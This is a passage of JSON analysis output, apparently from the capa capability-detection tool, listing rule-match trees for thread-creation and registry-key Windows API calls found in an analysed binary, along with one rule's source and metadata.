                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "android"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "pthread_create"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "System.Threading.Thread::Start"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "System.Threading.Thread::ctor"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "CreateThread"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651774558
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "_beginthread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "_beginthreadex"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "PsCreateSystemThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SHCreateThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SHCreateThreadWithHandle"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "CreateRemoteThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "CreateRemoteThreadEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "RtlCreateUserThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtCreateThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtCreateThreadEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ZwCreateThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ZwCreateThreadEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "create or open registry key": {
        "meta": {
          "name": "create or open registry key",
          "authors": [
            "michael.hunhoff@mandiant.com",
            "anushka.virgaonkar@mandiant.com"
          ],
          "scopes": {
            "static": "basic block",
            "dynamic": "call"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Operating System",
                "Registry",
                "Create Registry Key"
              ],
              "objective": "Operating System",
              "behavior": "Registry",
              "method": "Create Registry Key",
              "id": "C0036.004"
            },
            {
              "parts": [
                "Operating System",
                "Registry",
                "Open Registry Key"
              ],
              "objective": "Operating System",
              "behavior": "Registry",
              "method": "Open Registry Key",
              "id": "C0036.003"
            }
          ],
          "references": [],
          "examples": [
            "Practical Malware Analysis Lab 03-02.dll_:0x10004706",
            "Practical Malware Analysis Lab 11-01.exe_:0x401000",
            "493167E85E45363D09495D0841C30648:0x404D60",
            "B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x4045F2",
            "B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x40433E",
            "692f7fd6d198e804d6af98eb9e390d61:0x6000003"
          ],
          "description": "",
          "lib": true,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: create or open registry key\r\n    authors:\r\n      - michael.hunhoff@mandiant.com\r\n      - anushka.virgaonkar@mandiant.com\r\n    lib: true\r\n    scopes:\r\n      static: basic block\r\n      dynamic: call\r\n    mbc:\r\n      - Operating System::Registry::Create Registry Key [C0036.004]\r\n      - Operating System::Registry::Open Registry Key [C0036.003]\r\n    examples:\r\n      - Practical Malware Analysis Lab 03-02.dll_:0x10004706\r\n      - Practical Malware Analysis Lab 11-01.exe_:0x401000\r\n      - 493167E85E45363D09495D0841C30648:0x404D60\r\n      - B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x4045F2\r\n      - B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x40433E\r\n      - 692f7fd6d198e804d6af98eb9e390d61:0x6000003\r\n  features:\r\n    - or:\r\n      - api: advapi32.RegOpenKey\r\n      - api: advapi32.RegOpenKeyEx\r\n      - api: advapi32.RegCreateKey\r\n      - api: advapi32.RegCreateKeyEx\r\n      - api: advapi32.RegOpenCurrentUser\r\n      - api: advapi32.RegOpenKeyTransacted\r\n      - api: advapi32.RegOpenUserClassesRoot\r\n      - api: advapi32.RegCreateKeyTransacted\r\n      - api: ZwOpenKey\r\n      - api: ZwOpenKeyEx\r\n      - api: ZwCreateKey\r\n      - api: ZwOpenKeyTransacted\r\n      - api: ZwOpenKeyTransactedEx\r\n      - api: ZwCreateKeyTransacted\r\n      - api: NtOpenKey\r\n      - api: NtCreateKey\r\n      - api: SHRegOpenUSKey\r\n      - api: SHRegCreateUSKey\r\n      - api: RtlCreateRegistryKey\r\n      - api: Microsoft.Win32.RegistryKey::OpenSubKey\r\n      - api: Microsoft.Win32.RegistryKey::OpenBaseKey\r\n      - api: Microsoft.Win32.RegistryKey::OpenRemoteBaseKey\r\n      - api: Microsoft.Win32.RegistryKey::CreateSubKey\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651776352
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenKeyEx"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651776416
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegCreateKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegCreateKeyEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenCurrentUser"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenUserClassesRoot"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegCreateKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKeyEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKeyTransactedEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtOpenKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHRegOpenUSKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHRegCreateUSKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RtlCreateRegistryKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::OpenSubKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::OpenBaseKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::OpenRemoteBaseKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::CreateSubKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651776582
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenKeyEx"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651776614
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegCreateKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegCreateKeyEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenCurrentUser"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenUserClassesRoot"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegCreateKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKeyEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKeyTransactedEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtOpenKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHRegOpenUSKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHRegCreateUSKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RtlCreateRegistryKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::OpenSubKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::OpenBaseKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::OpenRemoteBaseKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::CreateSubKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651780816
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenKeyEx"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651780938
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegCreateKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegCreateKeyEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenCurrentUser"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenUserClassesRoot"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegCreateKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKeyEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKeyTransactedEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtOpenKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHRegOpenUSKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHRegCreateUSKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RtlCreateRegistryKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::OpenSubKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::OpenBaseKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::OpenRemoteBaseKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::CreateSubKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651781454
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenKeyEx"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651781495
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegCreateKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegCreateKeyEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenCurrentUser"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenUserClassesRoot"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegCreateKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKeyEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKeyTransactedEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtOpenKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHRegOpenUSKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHRegCreateUSKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RtlCreateRegistryKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::OpenSubKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::OpenBaseKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::OpenRemoteBaseKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::CreateSubKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651782064
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenKeyEx"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651782141
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegCreateKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegCreateKeyEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenCurrentUser"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenUserClassesRoot"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegCreateKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKeyEx"
                    }
